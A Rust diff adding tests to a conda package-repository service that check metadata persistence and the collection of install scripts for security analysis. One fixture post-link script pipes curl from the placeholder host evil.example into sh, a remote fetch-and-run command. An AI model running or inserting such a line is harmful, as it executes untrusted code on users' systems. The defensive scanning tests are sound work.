+        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
+        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
+            .expect("extracts");
+        let persisted = build_conda_metadata(
+            "numpy",
+            "1.26.4",
+            "py312h02b7e37_0",
+            "linux-64",
+            "conda_v2",
+            "d41d8cd98f00b204e9800998ecf8427e",
+            Some(&extracted),
+        );
+
+        // Every key channeldata.json reads must be present in what we wrote —
+        // the #4038 bug was precisely a read/write key mismatch.
+        let mut fields: BTreeMap<&'static str, String> = BTreeMap::new();
+        merge_channeldata_fields(&mut fields, &persisted);
+        for key in CHANNELDATA_METADATA_KEYS {
+            assert!(
+                fields.contains_key(key),
+                "channeldata.json reads `{key}`, but the write path never stored it"
+            );
+        }
+        assert_eq!(fields["summary"], "Fundamental package for array computing");
+        assert_eq!(fields["home"], "https://numpy.org");
+        assert_eq!(
+            fields["source_url"],
+            "https://pypi.io/packages/source/n/numpy/numpy-1.26.4.tar.gz"
+        );
+
+        // The virtual-repo channeldata builder reads the same document.
+        let entry = build_channeldata_entry(Some("1.26.4"), Some(&persisted));
+        assert_eq!(entry["summary"], "Fundamental package for array computing");
+        assert_eq!(entry["home"], "https://numpy.org");
+        assert_eq!(
+            entry["source_url"],
+            "https://pypi.io/packages/source/n/numpy/numpy-1.26.4.tar.gz"
+        );
+    }
+
+    /// A package with no about.json/run_exports must persist cleanly and serve
+    /// the documented empty shapes rather than dropping the upload.
+    #[test]
+    fn test_bare_package_persists_and_serves_empty_shapes() {
+        let files = vec![(
+            "info/index.json",
+            serde_json::to_vec(&serde_json::json!({
+                "name": "bare", "version": "1.0", "build": "0", "build_number": 0,
+            }))
+            .unwrap(),
+        )];
+        let package = build_test_conda_v1_package_with_info(&files);
+        let extracted = extract_conda_metadata(&package, "bare-1.0-0.tar.bz2").expect("extracts");
+        let persisted = build_conda_metadata(
+            "bare",
+            "1.0",
+            "0",
+            "noarch",
+            "conda_v1",
+            "d41d8cd98f00b204e9800998ecf8427e",
+            Some(&extracted),
+        );
+
+        assert_eq!(package_run_exports(Some(&persisted)), serde_json::json!({}));
+        assert_eq!(persisted["info_files"]["about_json"], "absent");
+        assert_eq!(persisted["paths"]["source"], "none");
+    }
+
+    /// The manifest is persisted whole, so the per-file index this epic builds
+    /// next can look a path up by name and get its hash.
+    #[test]
+    fn test_persisted_manifest_supports_per_file_lookup() {
+        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
+        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
+            .expect("extracts");
+        let persisted = build_conda_metadata(
+            "numpy",
+            "1.26.4",
+            "py312h02b7e37_0",
+            "linux-64",
+            "conda_v2",
+            "d41d8cd98f00b204e9800998ecf8427e",
+            Some(&extracted),
+        );
+
+        let found = persisted["paths"]["paths"]
+            .as_array()
+            .expect("the manifest is persisted as an array of entries")
+            .iter()
+            .find(|e| e["_path"] == "lib/python3.12/site-packages/numpy/__init__.py")
+            .expect("a packaged file is findable by path");
+        assert_eq!(
+            found["sha256"],
+            "1111111111111111111111111111111111111111111111111111111111111111"
+        );
+    }
+
+    /// The raw recipe is persisted verbatim for `conda_recipe.rs` to parse; the
+    /// ingest path must not have parsed or rewritten it.
+    #[test]
+    fn test_persisted_recipe_is_raw_text() {
+        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
+        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
+            .expect("extracts");
+        let persisted = build_conda_metadata(
+            "numpy",
+            "1.26.4",
+            "py312h02b7e37_0",
+            "linux-64",
+            "conda_v2",
+            "d41d8cd98f00b204e9800998ecf8427e",
+            Some(&extracted),
+        );
+
+        assert_eq!(
+            persisted["recipe"]["meta.yaml"].as_str(),
+            Some(TEST_RECIPE_META_YAML),
+            "the recipe must be handed on byte-for-byte, Jinja included"
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // Install scripts live in the PAYLOAD, not in `info/` (#4033)
+    // -----------------------------------------------------------------------
+
+    /// TEST FIXTURE: a shell post-link script with something worth reviewing in
+    /// it, so a test can prove the *bytes* travelled and not just the path.
+    const TEST_POST_LINK_SH: &[u8] = b"#!/bin/sh\ncurl -sL https://evil.example/x | sh\n";
+
+    /// TEST FIXTURE: the smallest `info/` tree that still extracts.
+    fn minimal_info_files() -> Vec<(&'static str, Vec<u8>)> {
+        vec![(
+            "info/index.json",
+            serde_json::to_vec(&serde_json::json!({
+                "name": "numpy", "version": "1.26.4",
+                "build": "py312h02b7e37_0", "build_number": 0,
+            }))
+            .unwrap(),
+        )]
+    }
+
+    /// TEST FIXTURE: a `.conda` (v2) package with BOTH members — the `info-`
+    /// tar and the `pkg-` payload tar. The existing
+    /// `build_test_conda_v2_package_with_info` writes only the info member,
+    /// which is exactly the blind spot this test group exists to cover.
+    fn build_test_conda_v2_package_with_payload(
+        info_files: &[(&str, Vec<u8>)],
+        payload_files: &[(&str, Vec<u8>)],
+    ) -> Vec<u8> {
+        let info_tar =
+            zstd::encode_all(std::io::Cursor::new(&build_info_tar(info_files)), 3).unwrap();
+        let payload_tar =
+            zstd::encode_all(std::io::Cursor::new(&build_info_tar(payload_files)), 3).unwrap();
+
+        let mut zip_buf = Vec::new();
+        {
+            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
+            let options = zip::write::SimpleFileOptions::default()
+                .compression_method(zip::CompressionMethod::Stored);
+            writer.start_file("metadata.json", options).unwrap();
+            std::io::Write::write_all(&mut writer, br#"{"conda_pkg_format_version":2}"#).unwrap();
+            writer
+                .start_file("info-numpy-1.26.4-py312h02b7e37_0.tar.zst", options)
+                .unwrap();
+            std::io::Write::write_all(&mut writer, &info_tar).unwrap();
+            writer
+                .start_file("pkg-numpy-1.26.4-py312h02b7e37_0.tar.zst", options)
+                .unwrap();
+            std::io::Write::write_all(&mut writer, &payload_tar).unwrap();
+            writer.finish().unwrap();
+        }
+        zip_buf
+    }
+
+    /// The whole point of the epic: a `.conda` keeps its link scripts in
+    /// `pkg-*.tar.zst`, which ingest never opened. The bytes must come back.
+    #[test]
+    fn test_conda_v2_payload_post_link_script_is_collected() {
+        let package = build_test_conda_v2_package_with_payload(
+            &minimal_info_files(),
+            &[
+                (
+                    "lib/python3.12/site-packages/numpy/__init__.py",
+                    b"x = 1\n".to_vec(),
+                ),
+                ("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec()),
+            ],
+        );
+
+        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
+
+        assert_eq!(
+            harvest.scripts,
+            vec![(
+                "bin/.numpy-post-link.sh".to_string(),
+                TEST_POST_LINK_SH.to_vec()
+            )],
+            "the payload script must be collected with its body intact"
+        );
+        assert!(harvest.unreadable.is_empty());
+        assert!(!harvest.truncated);
+    }
+
+    /// A v1 `.tar.bz2` keeps `info/` and the payload in one tar, so the same
+    /// walk has to find the script there too.
+    #[test]
+    fn test_conda_v1_payload_post_link_script_is_collected() {
+        let mut files = minimal_info_files();
+        files.push(("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec()));
+        files.push(("bin/.numpy-pre-unlink.sh", b"#!/bin/sh\nrm -f x\n".to_vec()));
+        let package = build_test_conda_v1_package_with_info(&files);
+
+        let harvest =
+            collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.tar.bz2");
+
+        let paths: Vec<&str> = harvest.scripts.iter().map(|(p, _)| p.as_str()).collect();
+        assert_eq!(
+            paths,
+            vec!["bin/.numpy-post-link.sh", "bin/.numpy-pre-unlink.sh"],
+            "every hook in the v1 tar is collected"
+        );
+        assert!(harvest.unreadable.is_empty());
+    }
+
+    /// Windows packages ship `.bat` hooks under `Scripts/`. `classify_script_path`
+    /// owns that decision; ingest must not second-guess it with its own matcher.
+    #[test]
+    fn test_conda_windows_bat_hook_is_collected() {
+        let package = build_test_conda_v2_package_with_payload(
+            &minimal_info_files(),
+            &[
+                ("Scripts/.numpy-post-link.bat", b"@echo off\r\n".to_vec()),
+                ("Lib/site-packages/numpy/__init__.py", b"x = 1\n".to_vec()),
+            ],
+        );
+
+        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
+
+        assert_eq!(
+            harvest.scripts.len(),
+            1,
+            "the .bat hook is a script, the module is not"
+        );
+        assert_eq!(harvest.scripts[0].0, "Scripts/.numpy-post-link.bat");
+    }
+
+    /// The recipe's archived copy under `info/` also matches the classifier.
+    /// Collecting it is deliberate — `package_analysis_service` dedupes by body
+    /// digest and marks the recipe copy — so ingest hands over both.
+    #[test]
+    fn test_conda_recipe_copy_of_script_is_also_collected() {
+        let mut info = minimal_info_files();
+        info.push(("info/recipe/post-link.sh", TEST_POST_LINK_SH.to_vec()));
+        let package = build_test_conda_v2_package_with_payload(
+            &info,
+            &[("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec())],
+        );
+
+        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
+
+        let paths: Vec<&str> = harvest.scripts.iter().map(|(p, _)| p.as_str()).collect();
+        assert!(
+            paths.contains(&"info/recipe/post-link.sh"),
+            "the info member is scanned too: {:?}",
+            paths
+        );
+        assert!(paths.contains(&"bin/.numpy-post-link.sh"), "{:?}", paths);
+    }
+
+    /// A package that ships no hooks yields nothing, and nothing is not a gap:
+    /// the analysis stays `Complete` so the UI can say "we looked, there are
+    /// none" rather than hedging on every package.
+    #[test]
+    fn test_conda_package_without_scripts_is_complete() {
+        let package = build_test_conda_v2_package_with_payload(
+            &minimal_info_files(),
+            &[(
+                "lib/python3.12/site-packages/numpy/__init__.py",
+                b"x = 1\n".to_vec(),
+            )],
+        );
+        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
+        assert!(harvest.scripts.is_empty());
+
+        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
+            .expect("extracts");
+        assert_eq!(
+            conda_analysis_completeness(Some(&extracted), &harvest),
+            crate::services::package_analysis_service::Completeness::Complete,
+        );
+    }
+
+    /// A script that was read in full is not a gap either.
+    #[test]
+    fn test_conda_readable_script_keeps_analysis_complete() {
+        let package = build_test_conda_v2_package_with_payload(
+            &minimal_info_files(),
+            &[("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec())],
+        );
+        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
+        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
+            .expect("extracts");
+
+        assert_eq!(harvest.scripts.len(), 1);
+        assert_eq!(
+            conda_analysis_completeness(Some(&extracted), &harvest),
+            crate::services::package_analysis_service::Completeness::Complete,
+        );
+    }
+
+    /// A hook past the per-entry read cap must be recorded as unreadable AND
+    /// must knock the analysis off `Complete`. Reporting `complete` while
+    /// dropping a script is the exact defect this epic removes.
+    #[test]
+    fn test_conda_oversized_script_is_unreadable_and_partial() {
+        let oversized = vec![b'#'; (MAX_CONDA_SCRIPT_ENTRY_BYTES + 1024) as usize];
+        let package = build_test_conda_v2_package_with_payload(
+            &minimal_info_files(),
+            &[("bin/.numpy-post-link.sh", oversized)],
+        );
+        assert!(
+            package.len() < 1024 * 1024,
+            "the compressed package stays small, so the cap is what bounds the read"
+        );
+
+        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
+
+        assert!(
+            harvest.scripts.is_empty(),
+            "an over-cap script is not silently truncated into the analysis"
+        );
+        assert_eq!(
+            harvest.unreadable,
+            vec!["bin/.numpy-post-link.sh".to_string()]
+        );
+
+        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
+            .expect("ingest must not fail on an over-cap script");
+        match conda_analysis_completeness(Some(&extracted), &harvest) {
+            crate::services::package_analysis_service::Completeness::Partial { reason, .. } => {
+                assert!(
+                    reason.contains("bin/.numpy-post-link.sh"),
+                    "the reason names the script we could not read: {reason}"
+                );
+            }
+            other => panic!("expected Partial, got {other:?}"),
+        }
+    }
+
+    /// The payload walk carries the shared entry-count cap. A package with more
+    /// entries than the cap stops early, and everything after that point is
+    /// unseen — which is `Partial`, not `Complete`.
+    #[test]
+    fn test_conda_payload_entry_cap_truncates_and_is_partial() {
+        let filler: Vec<(String, Vec<u8>)> = (0
+            ..crate::util::bounded_archive::MAX_INGEST_ARCHIVE_ENTRIES + 1)
+            .map(|i| (format!("lib/f{i}.py"), Vec::new()))
+            .collect();
+        let mut payload: Vec<(&str, Vec<u8>)> = filler
+            .iter()
+            .map(|(p, b)| (p.as_str(), b.clone()))
+            .collect();
+        payload.push(("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec()));
+
+        let package = build_test_conda_v2_package_with_payload(&minimal_info_files(), &payload);
+        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
+
+        assert!(
+            harvest.truncated,
+            "the walk must report that it stopped before the end"
+        );
+        assert!(
+            harvest.scripts.is_empty(),
+            "the script sits past the entry cap and was never reached"
+        );
+
+        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
+            .expect("extracts");
+        assert!(
+            matches!(
+                conda_analysis_completeness(Some(&extracted), &harvest),
+                crate::services::package_analysis_service::Completeness::Partial { .. }
+            ),
+            "a truncated scan cannot claim completeness"
+        );
+    }
+
+    /// An unreadable `info/` member and an unreadable script are both gaps, and
+    /// the recorded reason has to name both rather than the first one found.
+    #[test]
+    fn test_conda_completeness_reports_metadata_and_script_gaps_together() {
+        let harvest = CondaScriptHarvest {
+            scripts: Vec::new(),
+            unreadable: vec!["bin/.p-post-link.sh".to_string()],
+            truncated: false,
+        };
+        let extracted = serde_json::json!({
+            "info_files": { "paths_json": "unreadable", "about_json": "present" },
+        });
+
+        match conda_analysis_completeness(Some(&extracted), &harvest) {
+            crate::services::package_analysis_service::Completeness::Partial { reason, .. } => {
+                assert!(reason.contains("paths_json"), "{reason}");
+                assert!(reason.contains("bin/.p-post-link.sh"), "{reason}");
+            }
+            other => panic!("expected Partial, got {other:?}"),
+        }
+    }
+
+    /// Nothing decoded at all is `NotRead`, never `Complete` — unchanged by the
+    /// script work, and pinned here because it is the most dangerous mislabel.
+    #[test]
+    fn test_conda_completeness_without_extraction_is_not_read() {
+        assert!(matches!(
+            conda_analysis_completeness(None, &CondaScriptHarvest::default()),
+            crate::services::package_analysis_service::Completeness::NotRead { .. }
+        ));
+    }
+
+    /// A package whose container cannot be opened yields no scripts rather than
+    /// failing the ingest.
+    #[test]
+    fn test_conda_script_collection_never_fails_on_garbage() {
+        assert_eq!(
+            collect_conda_install_scripts(b"not a zip", "pkg-1.0-0.conda").scripts,
+            Vec::new()
+        );
+        assert_eq!(
+            collect_conda_install_scripts(b"not bzip2", "pkg-1.0-0.tar.bz2").scripts,
+            Vec::new()
+        );
+        assert_eq!(
+            collect_conda_install_scripts(b"whatever", "pkg.whl"),
+            CondaScriptHarvest::default()
+        );
+    }
+
+    /// The recipe files handed to the analyzer still come out of the extracted
+    /// document, and are unaffected by the script work.
+    #[test]
+    fn test_conda_recipe_files_come_from_the_extracted_document() {
+        let doc = serde_json::json!({
+            "recipe": { "meta.yaml": "package:\n  name: p\n" },
+        });
+        assert_eq!(
+            conda_recipe_files(&doc),
+            vec![("meta.yaml".to_string(), b"package:\n  name: p\n".to_vec())]
+        );
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -9628,5 +11307,209 @@ mod catalog_registration_tests {
             row.description.as_deref(),
             Some("a catalogued conda package")
         );
+    }
+}
+
+// ---------------------------------------------------------------------------
+// #4037/#4038: the full `info/` tree must survive a real publish and come back
+// out of the endpoints that serve it.
+// ---------------------------------------------------------------------------
+
+#[cfg(test)]
+mod info_tree_round_trip_tests {
+    use crate::api::handlers::test_db_helpers as tdh;
+
+    const ROUND_TRIP_RECIPE: &str = "package:\n  name: rtpkg\n  version: {{ version }}\n";
+
+    /// Build a valid conda v1 package carrying the whole `info/` tree, with
+    /// `index.json` agreeing with the filename the upload declares.
+    fn conda_v1_package_with_info_tree(name: &str, version: &str, build: &str) -> Vec<u8> {
+        let json = |v: serde_json::Value| serde_json::to_vec(&v).unwrap();
+        let members: Vec<(&str, Vec<u8>)> = vec![
+            (
+                "info/index.json",
+                json(serde_json::json!({
+                    "name": name,
+                    "version": version,
+                    "build": build,
+                    "build_number": 0,
+                    "subdir": "noarch",
+                    "depends": [],
+                })),
+            ),
+            (
+                "info/about.json",
+                json(serde_json::json!({
+                    "summary": "a round-tripped conda package",
+                    "description": "carries the whole info/ tree",
+                    "home": "https://example.invalid/rtpkg",
+                    "doc_url": "https://example.invalid/rtpkg/docs",
+                    "dev_url": "https://example.invalid/rtpkg/src",
+                    "source_url": "https://example.invalid/rtpkg-1.0.0.tar.gz",
+                    "license": "MIT",
+                    "license_family": "MIT",
+                })),
+            ),
+            (
+                "info/paths.json",
+                json(serde_json::json!({
+                    "paths_version": 1,
+                    "paths": [{
+                        "_path": "lib/rtpkg/__init__.py",
+                        "path_type": "hardlink",
+                        "sha256": "4444444444444444444444444444444444444444444444444444444444444444",
+                        "size_in_bytes": 7,
+                    }],
+                })),
+            ),
+            (
+                "info/recipe/meta.yaml",
+                ROUND_TRIP_RECIPE.as_bytes().to_vec(),
+            ),
+            (
+                "info/run_exports.json",
+                json(serde_json::json!({ "weak": ["rtpkg >=1.0.0,<2.0a0"] })),
+            ),
+            (
+                "info/hash_input.json",
+                json(serde_json::json!({ "python": "3.9.* *_cpython" })),
+            ),
+        ];
+
+        let mut tar_data = Vec::new();
+        {
+            let mut builder = tar::Builder::new(&mut tar_data);
+            for (path, bytes) in &members {
+                let mut header = tar::Header::new_gnu();
+                header.set_path(path).unwrap();
+                header.set_size(bytes.len() as u64);
+                header.set_mode(0o644);
+                header.set_cksum();
+                builder.append(&header, &bytes[..]).unwrap();
+            }
+            builder.finish().unwrap();
+        }
+
+        let mut enc = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
+        std::io::Write::write_all(&mut enc, &tar_data).unwrap();
+        enc.finish().unwrap()
+    }
+
+    /// Publish a package carrying the whole `info/` tree, then read it back
+    /// through `run_exports.json` and `channeldata.json`.
+    ///
+    /// Before #4038 both endpoints served fields the upload path never wrote:
+    /// every hosted package's run exports came back as `{}` and its
+    /// channeldata entry had no summary, home or source_url.
+    #[tokio::test]
+    async fn published_info_tree_reaches_run_exports_and_channeldata() {
+        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
+            return;
+        };
+
+        let body = conda_v1_package_with_info_tree("rtpkg", "1.0.0", "py39_0");
+        let req = axum::http::Request::builder()
+            .method("POST")
+            .uri(format!("/{}/upload", fx.repo_key))
+            .header("X-Conda-Subdir", "noarch")
+            .header("X-Package-Filename", "rtpkg-1.0.0-py39_0.tar.bz2")
+            .body(axum::body::Body::from(body))
+            .unwrap();
+        let (status, resp) = tdh::send(fx.router_with_auth(super::router()), req).await;
+        assert!(
+            status.is_success(),
+            "conda upload failed: {status} {}",
+            String::from_utf8_lossy(&resp)
+        );
+
+        let (re_status, re_body) = tdh::send(
+            fx.router_with_auth(super::router()),
+            tdh::get(format!("/{}/noarch/run_exports.json", fx.repo_key)),
+        )
+        .await;
+        let (cd_status, cd_body) = tdh::send(
+            fx.router_with_auth(super::router()),
+            tdh::get(format!("/{}/channeldata.json", fx.repo_key)),
+        )
+        .await;
+
+        fx.teardown().await;
+
+        assert_eq!(re_status, axum::http::StatusCode::OK);
+        let run_exports: serde_json::Value = serde_json::from_slice(&re_body).unwrap();
+        let served = &run_exports["packages"]["rtpkg-1.0.0-py39_0.tar.bz2"]["run_exports"];
+        assert_ne!(
+            served,
+            &serde_json::json!({}),
+            "run_exports.json served an empty object for a package that declares run exports"
+        );
+        assert_eq!(served["weak"][0], "rtpkg >=1.0.0,<2.0a0");
+
+        assert_eq!(cd_status, axum::http::StatusCode::OK);
+        let channeldata: serde_json::Value = serde_json::from_slice(&cd_body).unwrap();
+        let entry = &channeldata["packages"]["rtpkg"];
+        assert_eq!(entry["summary"], "a round-tripped conda package");
+        assert_eq!(entry["home"], "https://example.invalid/rtpkg");
+        assert_eq!(
+            entry["source_url"],
+            "https://example.invalid/rtpkg-1.0.0.tar.gz"
+        );
+        assert_eq!(entry["license"], "MIT");
+    }
+
+    /// The persisted document must carry the rest of the `info/` tree too, so
+    /// the per-file index and the recipe parser can pick it up from the
+    /// database rather than re-opening the archive.
+    #[tokio::test]
+    async fn published_info_tree_is_persisted_whole() {
+        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
+            return;
+        };
+
+        let body = conda_v1_package_with_info_tree("rtstore", "2.0.0", "py39_0");
+        let req = axum::http::Request::builder()
+            .method("POST")
+            .uri(format!("/{}/upload", fx.repo_key))
+            .header("X-Conda-Subdir", "noarch")
+            .header("X-Package-Filename", "rtstore-2.0.0-py39_0.tar.bz2")
+            .body(axum::body::Body::from(body))
+            .unwrap();
+        let (status, resp) = tdh::send(fx.router_with_auth(super::router()), req).await;
+        assert!(
+            status.is_success(),
+            "conda upload failed: {status} {}",
+            String::from_utf8_lossy(&resp)
+        );
+
+        let metadata: Option<serde_json::Value> = sqlx::query_scalar(
+            "SELECT am.metadata FROM artifact_metadata am
+             JOIN artifacts a ON a.id = am.artifact_id
+             WHERE a.repository_id = $1 AND a.is_deleted = false
+             LIMIT 1",
+        )
+        .bind(fx.repo_id)
+        .fetch_optional(&fx.pool)
+        .await
+        .expect("query artifact metadata")
+        .flatten();
+
+        fx.teardown().await;
+
+        let metadata = metadata.expect("a conda upload must persist artifact metadata");
+        assert_eq!(metadata["paths"]["source"], "paths.json");
+        assert_eq!(metadata["paths"]["has_hashes"], true);
+        assert_eq!(
+            metadata["paths"]["paths"][0]["_path"],
+            "lib/rtpkg/__init__.py"
+        );
+        assert_eq!(
+            metadata["recipe"]["meta.yaml"].as_str(),
+            Some(ROUND_TRIP_RECIPE),
+            "the recipe must reach the database as raw text"
+        );
+        assert_eq!(metadata["hash_input"]["python"], "3.9.* *_cpython");
+        assert_eq!(metadata["info_files"]["link_json"], "absent");
+        assert_eq!(metadata["info_files"]["about_json"], "present");
+        assert_eq!(metadata["has_install_scripts"], false);
     }
 }
